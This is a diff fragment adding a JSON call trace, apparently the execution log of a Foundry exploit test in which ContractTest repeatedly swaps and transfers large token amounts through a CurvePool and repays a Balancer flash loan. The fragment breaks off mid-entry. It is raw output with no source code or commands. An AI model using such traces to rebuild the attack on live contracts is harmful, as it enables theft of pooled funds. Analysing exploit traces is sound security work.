+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6742495405264905027057063 [6.742e24]"
+    },
+    {
+        "id": "134084",
+        "args": "1, 0, 6742495405264905027057063 [6.742e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "579482202328930014409 [5.794e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 6742495405264905027057063 [6.742e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "111650",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "21186949310675775927018 [2.118e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21186949310675775927018 [2.118e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "571535136477438291258370 [5.715e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "21186949310675775927018 [2.118e22]"
+    },
+    {
+        "id": "311866",
+        "args": "21186949310675775927018 [2.118e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "571535136477438291258370 [5.715e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21186949310675775927018 [2.118e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "273006",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "111650",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "9782748312702472589898 [9.782e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9782748312702472589898 [9.782e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560130935479464987921250 [5.601e23]"
+    },
+    {
+        "id": "143714",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "5280656212227189929957067 [5.28e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5280656212227189929957067 [5.28e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560130935479464987921250 [5.601e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2439341367666890434426841 [2.439e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9782748312702472589898 [9.782e21]"
+    },
+    {
+        "id": "109267",
+        "args": "9782748312702472589898 [9.782e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a1565f258c13a0a9"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560130935479464987921250 [5.601e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9782748312702472589898 [9.782e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7719997579894080364383908 [7.719e24]"
+    },
+    {
+        "id": "134084",
+        "args": "1, 0, 7719997579894080364383908 [7.719e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "572889213654294428905 [5.728e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 7719997579894080364383908 [7.719e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "111660",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "22835623031624509494869 [2.283e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22835623031624509494869 [2.283e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "573183810198387024826221 [5.731e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "22835623031624509494869 [2.283e22]"
+    },
+    {
+        "id": "317334",
+        "args": "22835623031624509494869 [2.283e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "573183810198387024826221 [5.731e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22835623031624509494869 [2.283e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "278474",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "111660",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "10476125391693357472304 [1.047e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10476125391693357472304 [1.047e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560824312558455872803656 [5.608e23]"
+    },
+    {
+        "id": "149172",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "6072524694851518704765832 [6.072e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6072524694851518704765832 [6.072e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560824312558455872803656 [5.608e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2831978803982983226704831 [2.831e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10476125391693357472304 [1.047e22]"
+    },
+    {
+        "id": "109277",
+        "args": "10476125391693357472304 [1.047e22], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a18e8064fae96bcf"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560824312558455872803656 [5.608e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10476125391693357472304 [1.047e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8904503498834501931470663 [8.904e24]"
+    },
+    {
+        "id": "134094",
+        "args": "1, 0, 8904503498834501931470663 [8.904e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "565625296222673345592 [5.656e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 8904503498834501931470663 [8.904e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "111660",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "24723345696246591421877 [2.472e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24723345696246591421877 [2.472e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "575071532863009106753229 [5.75e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "24723345696246591421877 [2.472e22]"
+    },
+    {
+        "id": "317324",
+        "args": "24723345696246591421877 [2.472e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "575071532863009106753229 [5.75e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24723345696246591421877 [2.472e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "278464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "111650",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "11259109990318106458597 [1.125e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11259109990318106458597 [1.125e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "561607297157080621789949 [5.616e23]"
+    },
+    {
+        "id": "149172",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "7036727845503242940368585 [7.036e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7036727845503242940368585 [7.036e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "561607297157080621789949 [5.616e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3317090217926105376296309 [3.317e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11259109990318106458597 [1.125e22]"
+    },
+    {
+        "id": "109267",
+        "args": "11259109990318106458597 [1.125e22], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a1ce02f7d4107356"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "561607297157080621789949 [5.616e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11259109990318106458597 [1.125e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10353818063429348316664894 [1.035e25]"
+    },
+    {
+        "id": "134170",
+        "args": "1, 0, 10353818063429348316664894 [1.035e25], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "557600449602675856497 [5.576e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 10353818063429348316664894 [1.035e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "111736",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "26900231297699103166374 [2.69e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26900231297699103166374 [2.69e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "577248418464461618497726 [5.772e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "26900231297699103166374 [2.69e22]"
+    },
+    {
+        "id": "317400",
+        "args": "26900231297699103166374 [2.69e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "577248418464461618497726 [5.772e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26900231297699103166374 [2.69e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "278540",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "111736",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "12147781953734194890288 [1.214e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12147781953734194890288 [1.214e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "562495969120496710221640 [5.624e23]"
+    },
+    {
+        "id": "149162",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "8222354838447359186767205 [8.222e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8222354838447359186767205 [8.222e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "562495969120496710221640 [5.624e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3923465755155912403669738 [3.923e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12147781953734194890288 [1.214e22]"
+    },
+    {
+        "id": "109267",
+        "args": "12147781953734194890288 [1.214e22], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a21634fc2b681220"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "562495969120496710221640 [5.624e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12147781953734194890288 [1.214e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12145820593603271590436943 [1.214e25]"
+    },
+    {
+        "id": "134170",
+        "args": "1, 0, 12145820593603271590436943 [1.214e25], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "548711704414016755633 [5.487e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 12145820593603271590436943 [1.214e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "111736",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "29430010876886894234757 [2.943e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29430010876886894234757 [2.943e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "579778198043649409566109 [5.797e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "29430010876886894234757 [2.943e22]"
+    },
+    {
+        "id": "317410",
+        "args": "29430010876886894234757 [2.943e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "579778198043649409566109 [5.797e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29430010876886894234757 [2.943e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "278550",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "111736",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "13161706364611749943476 [1.316e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13161706364611749943476 [1.316e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "563509893531374265274828 [5.635e23]"
+    },
+    {
+        "id": "149172",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "9695721080878920413807227 [9.695e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9695721080878920413807227 [9.695e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "563509893531374265274828 [5.635e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4691084347928885697791380 [4.691e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "13161706364611749943476 [1.316e22]"
+    },
+    {
+        "id": "109267",
+        "args": "13161706364611749943476 [1.316e22], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a268b1948b9ae0ef"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "563509893531374265274828 [5.635e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13161706364611749943476 [1.316e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "14386805428807806111598607 [1.438e25]"
+    },
+    {
+        "id": "137302",
+        "args": "1, 0, 14386805428807806111598607 [1.438e25], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "538842018733468006852 [5.388e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 14386805428807806111598607 [1.438e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "21974",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3262",
+        "args": "Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 10000000000000000000000 [1e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
